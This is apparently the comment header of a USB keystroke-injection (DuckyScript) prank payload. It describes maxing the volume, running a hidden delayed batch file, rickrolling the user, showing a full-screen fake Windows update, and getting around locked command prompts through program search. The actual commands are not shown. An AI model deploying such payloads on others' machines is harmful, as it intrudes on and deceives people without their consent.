REM Description:
REM the payload sets volume to maximum
REM creates batch file with delay which will run while the prompt window is minimized
REM after the first delay ends Never Gonna Give You Up starts playing on default browser
REM a few seconds later it opens edge (present in all windows computers) and opens fake windows update on full screen
REM "GUI SPACE" works for computers with locked prompts, which allows for program search
REM "GUI r" should be used for regular computers

REM set volume to max as fast as possible

REM splitting the repeat and adding delays between them did not solve it
